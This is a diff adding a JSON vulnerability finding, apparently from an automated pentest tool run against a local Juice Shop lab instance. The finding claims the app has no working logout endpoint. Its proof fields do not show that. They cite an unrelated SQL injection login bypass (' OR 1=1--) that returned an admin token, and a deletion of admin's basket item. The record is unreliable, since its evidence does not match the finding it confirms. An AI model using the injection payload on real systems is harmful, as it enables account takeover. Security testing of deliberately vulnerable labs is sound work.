@@ -1,0 +1,28 @@
+{
+  "id": "f_1784855354929_ad0024",
+  "action": "confirm",
+  "title": "No Logout Endpoint - Token Cannot Be Invalidated",
+  "severity": "medium",
+  "finding_kind": "vuln",
+  "location": "POST http://127.0.0.1:3010/rest/user/logout",
+  "url": "POST http://127.0.0.1:3010/rest/user/logout",
+  "description": "The application has no working logout endpoint. POST requests to /rest/user/logout return a 500 error with 'Unexpected path'. Without a logout mechanism, users cannot invalidate their session tokens, and stolen tokens remain valid permanently.",
+  "poc": "Probe request against POST http://127.0.0.1:3010/rest/user/logout; observed proving result from prior stage handoff: DELETE /api/BasketItems/3 (belonged to admin BasketId=1) returned {\"status\":\"success\",\"data\":{}} - verified via /rest/basket/1 showing item removed",
+  "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+  "evidence_ids": [
+    "ev_1784855352911_3bed6a"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784855352911_3bed6a",
+      "excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-24T01:09:14.929Z"
+}
